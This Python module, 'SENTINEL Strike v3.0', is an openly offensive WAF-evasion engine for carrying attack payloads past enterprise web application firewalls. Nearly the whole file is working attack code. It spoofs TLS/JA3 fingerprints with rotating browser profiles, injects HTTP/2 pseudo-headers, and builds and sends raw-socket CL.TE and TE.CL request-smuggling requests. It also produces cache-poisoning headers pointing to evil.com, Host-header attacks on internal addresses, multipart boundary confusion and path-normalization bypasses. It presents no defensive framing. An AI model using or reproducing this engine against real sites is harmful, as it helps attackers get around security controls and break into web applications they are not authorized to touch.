#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Advanced WAF Evasion Layer

Ultra-advanced techniques for bypassing enterprise WAFs:
- TLS Fingerprint Spoofing (JA3/JA4) via curl_cffi
- HTTP/2 Specific Bypasses via httpx
- Raw Socket Request Smuggling
- Real Browser Impersonation

Requirements:
    pip install curl_cffi httpx[http2]
"""

import asyncio
import ssl
from typing import Dict, Optional, Tuple, List
from dataclasses import dataclass
from enum import Enum
import random


# =============================================================================
# TLS FINGERPRINT SPOOFING (curl_cffi)
# =============================================================================

class BrowserImpersonation(Enum):
    """Browser impersonation profiles for curl_cffi."""
    CHROME_120 = "chrome120"
    CHROME_119 = "chrome119"
    CHROME_110 = "chrome110"
    CHROME_107 = "chrome107"
    CHROME_104 = "chrome104"
    CHROME_101 = "chrome101"
    CHROME_100 = "chrome100"
    CHROME_99 = "chrome99"
    EDGE_120 = "edge120"
    EDGE_101 = "edge101"
    SAFARI_17_0 = "safari17_0"
    SAFARI_16_0 = "safari16_0"
    SAFARI_15_5 = "safari15_5"
    FIREFOX_120 = "firefox120"
    FIREFOX_110 = "firefox110"


@dataclass
class TLSFingerprintConfig:
    """Configuration for TLS fingerprint spoofing."""
    browser: BrowserImpersonation = BrowserImpersonation.CHROME_120
    rotate_after: int = 10  # Rotate browser after N requests
    random_browser: bool = True


class TLSFingerprintSpoofer:
    """
    TLS Fingerprint Spoofer using curl_cffi.

    Bypasses WAFs that detect:
    - JA3 fingerprint
    - JA4 fingerprint
    - TLS cipher suite ordering
    - TLS extensions
    - ALPN protocols
    """

    def __init__(self, config: TLSFingerprintConfig = None):
        self.config = config or TLSFingerprintConfig()
        self.request_count = 0
        self.current_browser = self.config.browser
        self._session = None
        self._curl_available = False

        # Check if curl_cffi is available
        try:
            from curl_cffi.requests import Session
            self._curl_available = True
        except ImportError:
            print("⚠️ curl_cffi not installed. Run: pip install curl_cffi")

    def _get_random_browser(self) -> BrowserImpersonation:
        """Get random browser profile."""
        browsers = list(BrowserImpersonation)
        return random.choice(browsers)

    def _should_rotate(self) -> bool:
        """Check if browser should be rotated."""
        return self.request_count > 0 and self.request_count % self.config.rotate_after == 0

    def get_session(self):
        """Get curl_cffi session with browser impersonation."""
        if not self._curl_available:
            return None

        from curl_cffi.requests import Session

        if self._should_rotate() and self.config.random_browser:
            self.current_browser = self._get_random_browser()

        if self._session is None or self._should_rotate():
            self._session = Session(impersonate=self.current_browser.value)

        return self._session

    async def request(
        self,
        method: str,
        url: str,
        headers: Dict[str, str] = None,
        data: str = None,
        timeout: int = 15,
        proxy: str = None,
    ) -> Tuple[int, str, Dict[str, str]]:
        """
        Make request with TLS fingerprint spoofing.

        Returns:
            Tuple of (status_code, body, headers)
        """
        if not self._curl_available:
            raise RuntimeError("curl_cffi not available")

        session = self.get_session()
        self.request_count += 1

        kwargs = {
            "headers": headers or {},
            "timeout": timeout,
            "allow_redirects": False,
        }

        if data:
            kwargs["data"] = data

        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}

        # Run in thread pool since curl_cffi is sync
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: session.request(method, url, **kwargs)
        )

        return response.status_code, response.text, dict(response.headers)

    def get_current_fingerprint(self) -> str:
        """Get current browser fingerprint name."""
        return self.current_browser.value


# =============================================================================
# HTTP/2 SPECIFIC BYPASSES (httpx)
# =============================================================================

class HTTP2Bypass:
    """
    HTTP/2 specific bypass techniques.

    Exploits HTTP/2 features that WAFs may not handle:
    - Pseudo-header manipulation
    - HPACK compression tricks
    - Stream multiplexing
    - Server push abuse
    """

    def __init__(self):
        self._httpx_available = False
        self._client = None

        try:
            import httpx
            self._httpx_available = True
        except ImportError:
            print("⚠️ httpx not installed. Run: pip install httpx[http2]")

    async def get_client(self):
        """Get HTTP/2 capable client."""
        if not self._httpx_available:
            return None

        import httpx

        if self._client is None:
            self._client = httpx.AsyncClient(http2=True, verify=False)

        return self._client

    async def request_h2(
        self,
        method: str,
        url: str,
        headers: Dict[str, str] = None,
        data: str = None,
        timeout: int = 15,
    ) -> Tuple[int, str, Dict[str, str]]:
        """
        Make HTTP/2 request.

        Returns:
            Tuple of (status_code, body, headers)
        """
        if not self._httpx_available:
            raise RuntimeError("httpx not available")

        client = await self.get_client()

        kwargs = {
            "headers": headers or {},
            "timeout": timeout,
            "follow_redirects": False,
        }

        if data:
            kwargs["content"] = data

        response = await client.request(method, url, **kwargs)

        return response.status_code, response.text, dict(response.headers)

    def get_h2_smuggling_headers(self, payload: str) -> Dict[str, str]:
        """
        Generate HTTP/2 specific smuggling headers.

        HTTP/2 pseudo-headers can be manipulated in ways that confuse WAFs.
        """
        return {
            # Pseudo-header injection attempts
            ":path": f"/?q={payload}",
            ":authority": "target.com",
            # Header splitting attempts
            "x-custom": f"value\x00{payload}",
        }

    async def close(self):
        """Close HTTP/2 client."""
        if self._client:
            await self._client.aclose()
            self._client = None


# =============================================================================
# RAW SOCKET REQUEST SMUGGLING
# =============================================================================

class RawSocketSmuggler:
    """
    Raw socket request smuggling.

    Implements true CL.TE and TE.CL desync attacks at the TCP level,
    bypassing application-layer libraries that normalize requests.
    """

    def __init__(self):
        self.timeout = 10

    def _create_cl_te_request(
        self,
        host: str,
        path: str,
        payload: str,
        param: str = "id",
    ) -> bytes:
        """
        Create CL.TE desync request.

        Front-end uses Content-Length, back-end uses Transfer-Encoding.
        """
        # Smuggled request
        smuggled = f"GET {path}?{param}={payload} HTTP/1.1\r\nHost: {host}\r\nX: X"

        # Main request body
        body = f"0\r\n\r\n{smuggled}"

        # Calculate Content-Length to include only part of body
        # so back-end sees the rest as a new request
        fake_cl = len(body) - len(smuggled) - 4  # -4 for "0\r\n\r\n"

        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {fake_cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        )

        return request.encode()

    def _create_te_cl_request(
        self,
        host: str,
        path: str,
        payload: str,
        param: str = "id",
    ) -> bytes:
        """
        Create TE.CL desync request.

        Front-end uses Transfer-Encoding, back-end uses Content-Length.
        """
        # Smuggled payload in body
        smuggled_line = f"{param}={payload}"

        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-encoding: x\r\n"  # Obfuscated TE header
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET {path}?{smuggled_line} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X: X"
        )

        return request.encode()

    async def send_raw_request(
        self,
        host: str,
        port: int,
        request_bytes: bytes,
        use_ssl: bool = True,
    ) -> Tuple[int, str, Dict[str, str]]:
        """
        Send raw HTTP request over TCP socket.

        Returns:
            Tuple of (status_code, body, headers)
        """
        reader = None
        writer = None

        try:
            if use_ssl:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_context),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=self.timeout
                )

            # Send request
            writer.write(request_bytes)
            await writer.drain()

            # Read response
            response = await asyncio.wait_for(
                reader.read(65536),
                timeout=self.timeout
            )

            # Parse response
            response_str = response.decode('utf-8', errors='ignore')

            # Split headers and body
            if '\r\n\r\n' in response_str:
                headers_section, body = response_str.split('\r\n\r\n', 1)
            else:
                headers_section = response_str
                body = ""

            # Parse status line
            lines = headers_section.split('\r\n')
            status_line = lines[0] if lines else "HTTP/1.1 0 Unknown"

            try:
                status_code = int(status_line.split()[1])
            except (IndexError, ValueError):
                status_code = 0

            # Parse headers
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()

            return status_code, body, headers

        except Exception as e:
            return 0, str(e), {}

        finally:
            if writer:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass

    async def smuggle_cl_te(
        self,
        host: str,
        path: str,
        payload: str,
        param: str = "id",
        port: int = 443,
    ) -> Tuple[int, str, Dict[str, str]]:
        """
        Execute CL.TE request smuggling attack.
        """
        request = self._create_cl_te_request(host, path, payload, param)
        return await self.send_raw_request(host, port, request, use_ssl=(port == 443))

    async def smuggle_te_cl(
        self,
        host: str,
        path: str,
        payload: str,
        param: str = "id",
        port: int = 443,
    ) -> Tuple[int, str, Dict[str, str]]:
        """
        Execute TE.CL request smuggling attack.
        """
        request = self._create_te_cl_request(host, path, payload, param)
        return await self.send_raw_request(host, port, request, use_ssl=(port == 443))


# =============================================================================
# ELITE-LEVEL WAF BYPASS TECHNIQUES
# =============================================================================

class EliteBypass:
    """
    Elite-level WAF bypass techniques that exploit:
    - Protocol weaknesses
    - Parser edge cases
    - CDN/Cache behaviors
    - WebSocket uninspected traffic
    """

    @staticmethod
    def get_websocket_upgrade_headers(payload: str) -> Dict[str, str]:
        """
        WebSocket upgrade headers.

        Many WAFs don't inspect WebSocket traffic after upgrade.
        Send malicious payload in Sec-WebSocket-Protocol header.
        """
        import base64
        import random

        key = base64.b64encode(random.randbytes(16)).decode()

        return {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": key,
            "Sec-WebSocket-Version": "13",
            "Sec-WebSocket-Protocol": payload[:100],  # Smuggle in protocol
            "Origin": "null",
        }

    @staticmethod
    def get_cache_poisoning_headers(payload: str, cache_buster: str = None) -> Dict[str, str]:
        """
        Cache poisoning headers.

        Exploit discrepancies between cache key and WAF inspection:
        - X-Forwarded-Host
        - X-Original-URL
        - X-Rewrite-URL
        """
        import random
        buster = cache_buster or ''.join(
            random.choices('abcdef0123456789', k=8))

        # Sanitize payload for headers (ASCII only, URL-encoded)
        from urllib.parse import quote
        safe_payload = quote(payload[:50], safe='')

        return {
            # Cache key manipulation
            "X-Forwarded-Host": f"evil.com?{buster}",
            "X-Original-URL": f"/?cb={buster}&q={safe_payload}",
            "X-Rewrite-URL": f"/search?q={safe_payload}",

            # Request routing manipulation
            "X-Forwarded-Scheme": "https",
            "X-Forwarded-Proto": "https",

            # Cache-Control bypass
            "Pragma": "no-cache",
            "Cache-Control": "no-cache, no-store, private",
        }

    @staticmethod
    def get_content_type_edge_cases() -> List[str]:
        """
        Content-Type edge cases that confuse WAF parsers.

        WAF may fail to parse body if Content-Type is malformed.
        """
        return [
            # Tab character (many parsers ignore)
            "application/x-www-form-urlencoded\t",
            # Extra parameters
            "application/x-www-form-urlencoded; charset=utf-8; boundary=---",
            # Case variations
            "Application/X-WWW-Form-Urlencoded",
            # With null byte
            "application/x-www-form-urlencoded\x00application/json",
            # Multipart without boundary (parser confusion)
            "multipart/form-data",
            # JSON variants
            "application/json;charset=utf-8",
            "text/json",
            "application/javascript",
            # XML variants
            "application/xml",
            "text/xml",
            # Binary types (WAF may skip)
            "application/octet-stream",
            "image/gif",
        ]

    @staticmethod
    def get_host_header_attacks(target_host: str, payload: str) -> List[Dict[str, str]]:
        """
        Host header attacks for routing manipulation.

        Exploit trusted internal routing.
        """
        return [
            # Localhost bypass
            {"Host": "localhost", "X-Forwarded-Host": target_host},
            {"Host": "127.0.0.1", "X-Forwarded-Host": target_host},

            # Internal IP ranges
            {"Host": "192.168.1.1", "X-Forwarded-Host": target_host},
            {"Host": "10.0.0.1", "X-Forwarded-Host": target_host},
            {"Host": "172.16.0.1", "X-Forwarded-Host": target_host},

            # Port manipulation
            {"Host": f"{target_host}:443"},
            {"Host": f"{target_host}:80"},
            {"Host": f"{target_host}:8080"},

            # Subdomain trust
            {"Host": f"internal.{target_host}"},
            {"Host": f"admin.{target_host}"},
            {"Host": f"api.{target_host}"},

            # Absolute URL in Host
            {"Host": f"https://{target_host}/"},

            # Double Host header
            {"Host": target_host, "Host ": "localhost"},
        ]

    @staticmethod
    def create_graphql_batch(payloads: List[str], operation: str = "query") -> str:
        """
        GraphQL batching attack.

        Send multiple payloads in single request.
        WAF may only check first query.
        """
        import json

        batch = []
        for i, payload in enumerate(payloads):
            batch.append({
                "operationName": f"op{i}",
                "query": f"{operation} {{ search(q: \"{payload}\") {{ id }} }}",
                "variables": {"input": payload}
            })

        return json.dumps(batch)

    @staticmethod
    def get_protocol_confusion_headers() -> Dict[str, str]:
        """
        Protocol confusion headers.

        Trick WAF into thinking it's different protocol/format.
        """
        import random
        return {
            # Protocol hints
            "X-Requested-With": "XMLHttpRequest",
            "X-Prototype-Version": "1.7",
            "X-MicrosoftAjax": "Delta=true",

            # Mobile app headers (often trusted)
            "X-App-Version": "1.0.0",
            "X-Device-ID": ''.join(random.choices('0123456789abcdef', k=32)),
            "X-Platform": "android",

            # Internal service headers
            "X-Internal-Request": "true",
            "X-Service-Token": "internal",

            # Debug headers
            "X-Debug": "1",
            "X-Debug-Token": "test",
        }

    @staticmethod
    def create_multipart_smuggle(param: str, payload: str) -> Tuple[str, str]:
        """
        Multipart boundary confusion for payload smuggling.

        Returns (body, content_type)
        """
        import random
        # Create confusing boundaries
        real_boundary = "----WebKitFormBoundary" + \
            ''.join(random.choices('abcdefghijklmnop', k=16))
        fake_boundary = "----WebKitFormBoundary" + \
            ''.join(random.choices('qrstuvwxyz123456', k=16))

        # Body uses real boundary, Content-Type declares fake
        body = f"""--{real_boundary}
Content-Disposition: form-data; name="{param}"

{payload}
--{real_boundary}--"""

        content_type = f"multipart/form-data; boundary={fake_boundary}"

        return body, content_type

    @staticmethod
    def get_path_normalization_bypasses(path: str) -> List[str]:
        """
        Path normalization bypasses.

        Different servers normalize paths differently.
        """
        return [
            # Double encoding
            path.replace("/", "%252F"),
            # Backslash
            path.replace("/", "\\"),
            # Unicode slash
            path.replace("/", "／"),
            # Dot segments
            f"/./././{path}",
            f"/../../../{path}",
            # Case variations
            path.upper(),
            # Null byte termination
            f"{path}%00.html",
            f"{path}%00.jpg",
            # Semicolon
            f"{path};.css",
            f"{path};.js",
            # URL fragments
            f"{path}#",
            f"{path}#test",
            # Whitespace
            f"{path}%20",
            f"{path}%09",
        ]


# =============================================================================
# UNIFIED ADVANCED EVASION
# =============================================================================

@dataclass
class AdvancedEvasionConfig:
    """Configuration for advanced evasion."""
    use_tls_spoof: bool = True
    use_http2: bool = True
    use_raw_smuggling: bool = True
    use_elite: bool = True
    browser: BrowserImpersonation = BrowserImpersonation.CHROME_120
    rotate_browser: bool = True
    rotate_after: int = 10
    proxy: Optional[str] = None


class AdvancedEvasionEngine:
    """
    Unified advanced WAF evasion engine.

    Combines:
    - TLS fingerprint spoofing (curl_cffi)
    - HTTP/2 bypasses (httpx)
    - Raw socket smuggling
    - Elite bypass techniques
    """

    def __init__(self, config: AdvancedEvasionConfig = None):
        self.config = config or AdvancedEvasionConfig()

        # Initialize components
        self.tls_spoofer = TLSFingerprintSpoofer(
            TLSFingerprintConfig(
                browser=self.config.browser,
                rotate_after=self.config.rotate_after,
                random_browser=self.config.rotate_browser,
            )
        ) if self.config.use_tls_spoof else None

        self.http2 = HTTP2Bypass() if self.config.use_http2 else None
        self.smuggler = RawSocketSmuggler() if self.config.use_raw_smuggling else None
        self.elite = EliteBypass() if self.config.use_elite else None

        self.request_count = 0

    async def request_with_tls_spoof(
        self,
        method: str,
        url: str,
        headers: Dict[str, str] = None,
        data: str = None,
    ) -> Tuple[int, str, Dict[str, str]]:
        """Make request with TLS fingerprint spoofing."""
        if not self.tls_spoofer or not self.tls_spoofer._curl_available:
            raise RuntimeError("TLS spoofing not available")

        self.request_count += 1
        return await self.tls_spoofer.request(
            method, url, headers, data, proxy=self.config.proxy
        )

    async def request_with_http2(
        self,
        method: str,
        url: str,
        headers: Dict[str, str] = None,
        data: str = None,
    ) -> Tuple[int, str, Dict[str, str]]:
        """Make HTTP/2 request."""
        if not self.http2 or not self.http2._httpx_available:
            raise RuntimeError("HTTP/2 not available")

        self.request_count += 1
        return await self.http2.request_h2(method, url, headers, data)

    async def request_with_smuggling(
        self,
        host: str,
        path: str,
        payload: str,
        param: str = "id",
        technique: str = "cl_te",
    ) -> Tuple[int, str, Dict[str, str]]:
        """Make request with HTTP smuggling."""
        if not self.smuggler:
            raise RuntimeError("Smuggling not available")

        self.request_count += 1

        if technique == "cl_te":
            return await self.smuggler.smuggle_cl_te(host, path, payload, param)
        else:
            return await self.smuggler.smuggle_te_cl(host, path, payload, param)

    def get_elite_headers(self, technique: str, target: str = "", payload: str = "") -> Dict[str, str]:
        """Get elite bypass headers."""
        if not self.elite:
            return {}

        if technique == "websocket":
            return self.elite.get_websocket_upgrade_headers(payload)
        elif technique == "cache":
            return self.elite.get_cache_poisoning_headers(payload)
        elif technique == "protocol":
            return self.elite.get_protocol_confusion_headers()
        else:
            return {}

    def get_capabilities(self) -> Dict[str, bool]:
        """Get available capabilities."""
        return {
            "tls_spoof": self.tls_spoofer is not None and self.tls_spoofer._curl_available,
            "http2": self.http2 is not None and self.http2._httpx_available,
            "raw_smuggling": self.smuggler is not None,
            "elite": self.elite is not None,
        }

    async def close(self):
        """Clean up resources."""
        if self.http2:
            await self.http2.close()


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def create_advanced_evasion(
    use_tls_spoof: bool = True,
    use_http2: bool = True,
    use_smuggling: bool = True,
    proxy: str = None,
) -> AdvancedEvasionEngine:
    """Create advanced evasion engine with configuration."""
    config = AdvancedEvasionConfig(
        use_tls_spoof=use_tls_spoof,
        use_http2=use_http2,
        use_raw_smuggling=use_smuggling,
        proxy=proxy,
    )
    return AdvancedEvasionEngine(config)


# Available browser profiles for export
BROWSER_PROFILES = {name: member.value for name,
                    member in BrowserImpersonation.__members__.items()}
